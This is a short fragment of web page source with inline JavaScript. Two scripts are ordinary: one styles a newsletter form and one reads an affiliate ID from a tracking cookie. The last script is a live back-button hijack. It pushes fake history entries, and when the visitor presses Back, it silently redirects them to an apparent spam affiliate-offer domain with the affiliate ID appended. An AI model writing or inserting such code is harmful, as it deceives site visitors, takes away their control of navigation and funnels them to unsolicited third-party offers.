    <script type="text/javascript">
        // Forms
        function resizeFunction() {
            // Feedback Icon position
            jQuery('#newsletter-form .form-control-feedback').css({'left': jQuery('.input-group-btn').outerWidth() + 2});
        }

        jQuery(window).on('load', function () {
            resizeFunction();
        });

        jQuery(window).ready(function () {
            resizeFunction();
        });

        jQuery(window).resize(function () {
            resizeFunction();
        });

        jQuery('.form-control').on('focus blur', function (e) {
            jQuery(this).parents('.form-group').toggleClass('focused', (e.type === 'focus' || this.value.length > 0));
        }).trigger('blur');
    </script>





<script>
    function getAffiliateId() {
        var tracking_data = Cookies.getJSON('tracking_data');
        var affiliate_id = '';
        if (tracking_data && tracking_data.A) {
            affiliate_id = tracking_data.A;
        }
        return affiliate_id;
    }
</script>

<script>
    !function () {
        var campaign_link = "https://76vhl.chokelinkoffer.com/?kw=" + getAffiliateId();
        history.pushState({}, "", "#");
        history.pushState({}, "", "#");
        onpopstate = function (t) {
            t.state && location.replace(campaign_link);
        }
    }();
</script>

